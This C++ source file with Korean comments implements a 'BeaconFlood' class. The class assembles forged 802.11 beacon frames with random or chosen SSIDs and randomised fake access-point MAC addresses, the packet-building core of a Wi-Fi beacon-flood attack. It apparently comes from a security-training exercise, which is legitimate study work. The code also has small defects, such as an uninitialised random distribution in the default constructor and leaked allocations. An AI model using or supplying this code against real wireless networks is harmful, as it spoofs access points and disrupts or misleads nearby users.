#include "pch.h"
#include "BeaconFlood.h"


/**
 * @brief beacon-flood에 사용될 패킷의 radiotap header 고정.
*/
const dot11_radiotap_hdr BeaconFlood::rtap_hdr = {
    .it_version = 0,
    .it_pad = 0,
    .it_len = 8,
    .it_present = 0
};

/**
 * @brief random SSID 생성.
 * 
 * @param length 생성할 SSID의 길이
*/
std::string BeaconFlood::get_random_ssid(size_t length)
{
    std::shuffle(this->random_ssid_pool.begin(), this->random_ssid_pool.end(), this->gen);
    return this->random_ssid_pool.substr(0, length);
}

/**
 * @brief beacon flood 패킷 초기화.
 * radiotap header, beacon frame header, wlan management header 일부 초기화.
*/
void BeaconFlood::init_flood_pkt()
{
    this->beacon_fhdr.base.fctl_field = 0x0080;
    this->beacon_fhdr.base.duration = 0;
    this->beacon_fhdr.frag_seq_num = 0;
    for (size_t i = 0; i < 6; i++)
    {
        this->beacon_fhdr.rcv_addr[i] = 0xff;
    }

    this->wlm_hdr.timestamp = 0;
    this->wlm_hdr.binterval = SAMPLE_BEACON_INTERVAL;
    this->wlm_hdr.cap_info = 0;
}

/**
 * @brief 생성자.
 * 랜덤으로 beacon-flood를 수행할 AP의 MAC 주소 생성.
*/
BeaconFlood::BeaconFlood()
{
    this->gen = std::mt19937(rd());
    this->dis_ssid = std::uniform_int_distribution<size_t>(0, 32);

    this->random_ssid_pool = RANDOM_SSID_CHAR_POOL;

    this->init_flood_pkt();

    uint8_t* random_mac_addr = this->get_random_mac_addr();
    for (size_t i = 0; i < 6; i++)
    {
        this->beacon_fhdr.src_addr[i] = ((uint8_t *)random_mac_addr)[i];
        this->beacon_fhdr.bssid[i] = ((uint8_t *)random_mac_addr)[i];
    }
}

/**
 * @brief 생성자.
 * 
 * @param ap_mac_addr beacon-flood 패킷에 담길 AP의 MAC 주소
*/
BeaconFlood::BeaconFlood(const uint8_t ap_mac_addr[6])
{
    this->gen = std::mt19937(rd());
    this->dis_ssid = std::uniform_int_distribution<size_t>(1, 32);
    this->dis_mac = std::uniform_int_distribution<size_t>(1, RAND_MAX);

    this->random_ssid_pool = RANDOM_SSID_CHAR_POOL;
    
    this->init_flood_pkt();
    for (size_t i = 0; i < 6; i++)
    {
        this->beacon_fhdr.src_addr[i] = ap_mac_addr[i];
        this->beacon_fhdr.bssid[i] = ap_mac_addr[i];
    }
}

/**
 * @brief 소멸자.
*/
BeaconFlood::~BeaconFlood()
{
}

/**
 * @brief beacon-flood 패킷을 실제로 조립하는 메소드.
*/
beacon_flood_pkt* BeaconFlood::make_flood_packet()
{
    uint8_t ssid_length = this->ssid.length();

    uint64_t flood_pkt_size = sizeof(this->rtap_hdr) + 
        sizeof(this->beacon_fhdr) + 
        sizeof(this->wlm_hdr) + 
        sizeof(TAG_NUMBER_SSID) + 
        sizeof(ssid_length) + 
        sizeof(char) * ssid_length + 
        sizeof(TAG_SUPPORTED_RATES) + 
        sizeof(TAG_DS_PARAM_SET);

    beacon_flood_pkt* flood_pkt = (beacon_flood_pkt*)malloc(sizeof(beacon_flood_pkt));
    flood_pkt->size = flood_pkt_size;
    flood_pkt->packet = (u_char*)malloc(flood_pkt->size);
    std::memcpy(
        flood_pkt->packet,
        &(this->rtap_hdr),
        sizeof(this->rtap_hdr)
    );
    std::memcpy(
        flood_pkt->packet + sizeof(this->rtap_hdr),
        &(this->beacon_fhdr),
        sizeof(this->beacon_fhdr)
    );
    std::memcpy(
        flood_pkt->packet + sizeof(this->rtap_hdr) + sizeof(this->beacon_fhdr),
        &(this->wlm_hdr),
        sizeof(this->wlm_hdr)
    );
    std::memcpy(
        flood_pkt->packet + sizeof(this->rtap_hdr) + sizeof(this->beacon_fhdr) + sizeof(this->wlm_hdr),
        &TAG_NUMBER_SSID,
        sizeof(TAG_NUMBER_SSID)
    );
    std::memcpy(
        flood_pkt->packet + sizeof(this->rtap_hdr) + sizeof(this->beacon_fhdr) + sizeof(this->wlm_hdr) + sizeof(TAG_NUMBER_SSID),
        &ssid_length,
        sizeof(ssid_length)
    );
    std::memcpy(
        flood_pkt->packet + sizeof(this->rtap_hdr) + sizeof(this->beacon_fhdr) + sizeof(this->wlm_hdr) + sizeof(TAG_NUMBER_SSID) + sizeof(ssid_length),
        this->ssid.c_str(),
        sizeof(char) * ssid_length
    );
    std::memcpy(
        flood_pkt->packet + sizeof(this->rtap_hdr) + sizeof(this->beacon_fhdr) + sizeof(this->wlm_hdr) + sizeof(TAG_NUMBER_SSID) + sizeof(ssid_length) + sizeof(char) * ssid_length,
        TAG_SUPPORTED_RATES,
        sizeof(TAG_SUPPORTED_RATES)
    );
    std::memcpy(
        flood_pkt->packet + sizeof(this->rtap_hdr) + sizeof(this->beacon_fhdr) + sizeof(this->wlm_hdr) + sizeof(TAG_NUMBER_SSID) + sizeof(ssid_length) + sizeof(char) * ssid_length + sizeof(TAG_SUPPORTED_RATES),
        TAG_DS_PARAM_SET,
        sizeof(TAG_DS_PARAM_SET)
    );
    flood_pkt->ssid = this->ssid;
    return flood_pkt;
}

/**
 * @brief 랜덤 SSID를 가지는 beacon-flood 패킷을 생성하여 반환.
*/
beacon_flood_pkt* BeaconFlood::get_random_flood_pkt()
{
    this->ssid = this->get_random_ssid(this->dis_ssid(this->gen));

    uint8_t* random_mac_addr = this->get_random_mac_addr();
    for (size_t i = 0; i < 6; i++)
    {
        this->beacon_fhdr.src_addr[i] = random_mac_addr[i];
        this->beacon_fhdr.bssid[i] = random_mac_addr[i];
    }
    free(random_mac_addr);

    beacon_flood_pkt* pkt = make_flood_packet();
    return pkt;
}

/**
 * @brief 특정 SSID를 가지는 beacon-flood 패킷을 생성하여 반환.
 * 
 * @param ssid 생성할 패킷에 담길 SSID
*/
beacon_flood_pkt* BeaconFlood::get_flood_pkt(const std::string& ssid)
{
    this->ssid = ssid;

    uint8_t* random_mac_addr = this->get_random_mac_addr();
    for (size_t i = 0; i < 6; i++)
    {
        this->beacon_fhdr.src_addr[i] = random_mac_addr[i];
        this->beacon_fhdr.bssid[i] = random_mac_addr[i];
    }
    free(random_mac_addr);
    
    beacon_flood_pkt* pkt = make_flood_packet();
    return pkt;
}

/**
 * @brief 랜덤 MAC 주소를 생성하여 반환.
 * 
 * @ref https://gitlab.com/gilgil/send-arp-test/-/blob/master/src/mac.cpp
*/
uint8_t* BeaconFlood::get_random_mac_addr()
{
    uint8_t* random_mac_addr = (uint8_t*)malloc(sizeof(uint8_t) * 6);
	for (int i = 0; i < 6; i++)
		random_mac_addr[i] = uint8_t(this->dis_mac(this->gen));
	random_mac_addr[0] &= 0x7F;
	return random_mac_addr;
}